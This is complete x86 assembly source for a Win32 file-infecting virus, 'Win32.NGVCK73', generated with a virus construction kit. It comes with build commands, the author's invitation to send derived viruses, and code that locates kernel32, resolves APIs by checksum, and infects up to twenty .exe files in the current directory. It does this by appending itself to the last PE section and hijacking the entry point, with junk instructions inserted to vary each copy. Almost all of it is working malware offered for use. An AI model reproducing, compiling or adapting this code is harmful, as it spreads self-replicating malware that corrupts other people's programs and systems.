              
;
;
; Win32.NGVCK73 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK73
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 31
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 32194 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov eax, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
                                        ; mov ebp, eax
 mov ebp, eax
 sub ebp, offset Delta
 jmp KernelSearchStart


;                  [ ///// * Data * \\\\\ ]

Data:
 TempApisearch3 dd 0h
 NTableVA    dd 0h

 APIOffsets:
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h

 filemask    db '*.exe',0

 APINames:
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h

 FileHandle  dd 0h
 OldBase     dd 400000h
 ATableVA    dd 0h
 MapAddress  dd 0h
 AlignReg2   dd 0h
 KernelPE    dd 0h
 db 'Win32.NGVCK73 - SnakeByte',0
 KernelMZ    dd 0h
 OldEIP      dd 0h
 InfCounter  dd 0h
 K32Trys     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 AlignReg1   dd 0h
 FindHandle  dd 0h
 counter     dw 0h
 Trash1      dd 0h
 MapHandle   dd 0h
 NTableTemp  dd 0h
 TempAPI     dd 0h
 OTableVA    dd 0h
 NewEIP      dd 0h
 NewSize     dd 0h




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, NumberOfApis
                                        ; clear edx
 and edx, 0
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [edx+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov edx, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
 adc eax, 52359340d                     ; Trash
                                        ; get OTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
                                        ; load API Names and Offsets
 lea esi, [ebp+APINames]

 mov ebx, offset APIOffsets
 add ebx, ebp


GetApisLoop: 

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; ebx points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
 and edx, 5781707d                      ; Trash
                                        ; add esi, 4
 dec esi
 add esi, 5d
                                        ; clear edx
 mov edx, -35716d
 add edx, 35716d
 add edx, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], -1
 and dword ptr [ebx], edx
                                        ; add ebx, 4
 add ebx, 4d
 dec ecx
 jnz GetApisLoop
 lea edi, [ebp+Outbreak]
 xchg edi, esi

 push esi
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; mov ebx, 6014
 mov ebx, ( 6014d + 19d )
 sub ebx, 19d
 cmp ebx, 6014d
 je Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [ecx+3Ch]
 pop ebx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        ; mov eax, 59009
 mov eax, ( 59009d + 14d )
 sub eax, 14d
 cmp eax, 59009d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; clear ecx
 sub ecx, ecx
 xor ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ecx
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, 66816d
 sub ecx, 66816d
 add ecx, edx
                                        ; mov edi, edx
 push edx
 pop edi
 push edi
 mov dword ptr [ebp+TempApisearch3], 0
 add dword ptr [ebp+TempApisearch3], esi
 cld
 ror eax, 3d                            ; Trash

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [esi]
 LoopChsksm:
                                        ; clear ebx
 xor ebx, ebx
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 shl bx,8d
 rcl edx, 5d                            ; Trash
 sub eax, ebx
 shr edx, 27d                           ; Trash
 cmp bx, 0
 je LoopConti
                                        ; clear ebx
 mov ebx, -30282d
 add ebx, 30282d
 mov bl, byte ptr [edi]
 sub eax, ebx
                                        ; add edi, 1
 sub edi, -1d
 cmp bx, 0
 jne LoopChsksm
LoopConti:
 cmp eax, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 push dword ptr [ebp+NTableTemp]
 pop ecx
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear edx
 mov edx, -20146d
 add edx, 20146d
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, ebx
 movzx edx, word ptr [ebx]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -56778d
 add edx, 56778d
 mov eax, dword ptr [ebp+AlignReg1]
 div ebx
                                        ; add eax, 1
 sub eax, -1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear esi
 xor esi, esi
 xor esi, dword ptr [ebp+OldBase]

 not ebx                                ; Trash
 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi

                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 dec ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 push edx
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+OldBase]

 push ebx
 pop dword ptr [ebp+retBase]

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 sub dword ptr [ebp+Trash1], 1365888    ; Trash
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea ecx, [ebp+filemask]
 xchg ecx, ebx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 cmp eax, 0
 je EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 test ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edi, dword ptr [esp]
                                        ; round to pages
 shr edi, 16d
 ror edi, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 6h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz NoKernel
                                        ; check for ZM
 movzx edx, word ptr [edi]
 xor edx, 'ZM'
 jz CheckPE

GK2:
 sub edi, 65536d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 and dword ptr [ebp+Trash1], 1857277    ; Trash
                                        ; add edi, 60
 add edi, 60d
 mov ecx, ebx                           ; Trash
 mov edx, [edi]
 add edi, -60d
 add edx, edi
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 push edx
 pop dword ptr [ebp+KernelPE]
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], edi

 mov edx, offset GetApis
 add edx, ebp

 mov ebx, 49777038d                     ; Trash
 push edx
 sub dword ptr [ebp+Trash1], 842336     ; Trash
ret

;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 push 0
 pop ecx

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 sub ecx, -1d
 push ecx
 mov eax, 80000000h or 40000000h
 push eax
 lea edi, [ebp+WFD_szFileName]

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 push eax
 pop dword ptr [ebp+FileHandle]

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 inc dword ptr [ebp+Trash1]             ; Trash
 push edx

                                        ; clear ecx
 xor ecx, ecx
 push ecx
 push edx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 sub eax, 1
 add eax, 1
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 rcl ecx, 17d                           ; Trash
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, offset WIN32_FIND_DATA
 add eax, ebp

 push eax
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ecx, edx

 push ecx
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edi, [ebp+WFD_szFileName]
 xchg ebx, edi

                                        ; mov edx, 276
 mov edx, ( 276d - 4d )
 add edx, 4d

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 add ebx, 1d
 dec edx
 jnz ClearOldData2
 popad
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [edx+3Ch]
 add esi, edx
                                        ; get File Alignment
 mov ecx, [esi+3Ch]
                                        ; mov eax, -1
 mov eax, ( -1d + 2d )
 sub eax, 2d
 and eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 push ecx
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; clear eax
 xor eax, eax
 xor eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, esi
 add eax, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, eax
 sbb ebx, 28d                           ; Trash
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 dec edx
 imul edx, edx, 28h
 add eax, edx
                                        ; add eax, 120
 inc eax
 xor dword ptr [ebp+Trash1], 1708251    ; Trash
 add eax, 119d
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [esi+74h]
 clc
 rcl edx, 3
 add eax, edx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ebx
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], edx
                                        ; clear edx
 mov edx, -1599d
 add edx, 1599d

 add edx, [eax+10h]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, -27991d
 add ecx, 27991d
 add ecx, edx
 add eax, 14h
 add edx, [eax]
 sub eax, 14h
 adc dword ptr [ebp+Trash1], 1094749    ; Trash
 push edx
 mov ebx, ecx
 add eax, 0Ch
 add ebx, [eax]
 sub eax, 0Ch
 and dword ptr [ebp+Trash1], 133032     ; Trash
 mov dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ebx
 mov ebx, [eax+10h]
 push ebx
                                        ; calculate new section size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], ebx
 pop ebx
 add ebx,  (VirusSize-638d)
 add ebx, 638d
 mov dword ptr [eax+08h], ebx
 mov ebx, dword ptr [eax+0Ch]
 add ebx, dword ptr [eax+10h]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov edx, VirusSize
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+InfCounter]
 sub edx, 1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 xor ecx, ecx
 push ecx
 call ExitProcess



end FakeCode

